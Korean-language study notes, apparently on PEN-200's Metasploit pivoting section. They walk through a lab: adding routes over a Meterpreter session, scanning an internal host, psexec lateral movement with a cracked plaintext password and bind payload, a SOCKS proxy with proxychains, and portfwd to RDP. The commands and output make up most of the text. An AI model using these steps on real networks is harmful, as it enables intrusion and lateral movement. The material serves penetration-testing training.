# 21.3.3 Metasploit 피벗팅

> **Pivoting with Metasploit** · PEN-200 §21.3.3

피벗팅(pivoting)은 침해한 호스트를 발판 삼아 원래는 닿지 않던 네트워크로 넘어가는 기술임. 손으로 하던 포트 리다이렉션·터널링을 Metasploit 이 모듈로 제공함.

시작은 발판 호스트의 인터페이스 확인임. `ipconfig` 에 두 번째 어댑터가 잡히면 그쪽이 내부 대역임.

```
C:\Users\luiza> ipconfig
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::c489:5302:7182:1e97%11
   IPv4 Address. . . . . . . . . . . : 192.168.50.223
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:89dc%14
   IPv4 Address. . . . . . . . . . . : 172.16.5.199
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
C:\Users\luiza>
```

두 번째 인터페이스가 172.16.5.199 이므로 172.16.5.0/24 가 새 사냥터임. 발판에 Meterpreter 세션을 띄운 뒤 `bg` 로 뒤로 보내고, `route add <네트워크> <세션ID>` 로 그 세션을 경유하는 경로를 등록함. 등록 결과는 `route print` 로 확인함.

```
[*] Started HTTPS reverse handler on https://192.168.119.4:443
...
[*] Meterpreter session 12 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-05
05:13:42 -0400
meterpreter >
```

```
meterpreter > bg
[*] Backgrounding session 12...
msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added
msf6 exploit(multi/handler) > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.255.0      Session 12
[*] There are currently no IPv6 routes defined.
```

**경로가 생기면 Metasploit 모듈이 그 대역을 직접 다룰 수 있음.** 예로 포트 스캔 auxiliary 모듈을 내부 IP 에 겨눔. 대역 전체(`172.16.5.0/24`)를 주면 오래 걸리므로 실습에서는 호스트 하나와 포트 두 개로 좁힘.

```
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
[+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
[*] 172.16.5.200:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

445 와 3389 가 열려 있으므로 SMB·RDP 를 노림. 앞 절에서 Kiwi 로 뽑은 luiza 의 NTLM 해시를 크랙해 평문을 얻었고 그 계정이 두 번째 머신의 로컬 관리자라는 전제로 `exploit/windows/smb/psexec` 를 씀.

⚠️ **여기가 이 절에서 제일 잘 틀리는 지점임 — 추가한 route 는 «이미 성립된 연결» 위에서만 동작함.** 그래서 두 번째 타겟에서 얻을 셸은 `windows/x64/meterpreter/bind_tcp` 같은 bind 페이로드여야 함. reverse 페이로드는 타겟에 우리 네트워크로 돌아올 경로가 없어 대개 붙지 않음.

```
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
```

`run` 하면 발판 세션을 경유해(`via session 12`) 두 번째 타겟의 Meterpreter 세션이 열림.

```
msf6 exploit(windows/smb/psexec) > run
[*] 172.16.5.200:445 - Connecting to the server...
[*] 172.16.5.200:445 - Authenticating to 172.16.5.200:445|ITWK02 as user 'luiza'...
[*] 172.16.5.200:445 - Selecting PowerShell target
```

**`route add` 를 손으로 치는 대신 autoroute 모듈로 자동화할 수 있음.** 이 모듈은 발판 호스트의 «라우팅 테이블을 읽어» 도달 가능한 서브넷을 알아서 등록함. 실습에서는 앞서 수동으로 넣은 경로를 `route flush` 로 지우고 시작함. 옵션은 `SESSION` 하나만 채우면 됨.


**autoroute 와 socks_proxy 는 역할이 다름.** autoroute 가 놓는 경로는 Metasploit «내부»에서만 유효함 — msfconsole 의 모듈은 그 경로를 타지만 Kali 의 다른 도구는 못 탐. 프레임워크 «밖»의 도구를 통과시키려면 `auxiliary/server/socks_proxy` 로 SOCKS 프록시를 세워야 함. 기본 대기 포트는 1080 이고, `SRVHOST` 를 127.0.0.1, `VERSION` 을 5 로 두어 SOCKS5 로 띄움. `run -j` 는 백그라운드 job 으로 돌리는 것임.

```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
Module options (auxiliary/server/socks_proxy):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen
on. This must be an address on the local machine or 0.0.0.0 to listen on all
addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.

```

프록시가 떴으면 `/etc/proxychains4.conf` 의 `[ProxyList]` 를 이 프록시로 맞춤.

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

**포트 하나만 끌어오면 되는 경우는 Meterpreter 세션 안의 `portfwd` 가 더 간단함.** 세션에 `sessions -i <ID>` 로 들어가 사용법을 확인함.

```
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] Starting interaction with 5...
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect
to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

로컬 3389 를 내부 호스트 172.16.5.200 의 3389 로 넘기는 형태임 — `-l` 이 로컬 대기 포트, `-p` 가 원격 접속 포트, `-r` 이 원격 호스트임.

```
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] Local TCP relay created: :3389 <-> 172.16.5.200:3389
```

이후로는 로컬 루프백에 붙기만 하면 내부 호스트의 RDP 에 닿음.

```
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza

failure 'self-signed certificate (18)' at stack position 0
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - CN = itwk02
```

두 번째 타겟이 또 다른 네트워크에 물려 있다면 같은 방식을 겹쳐 피벗 체인을 만들 수 있음.
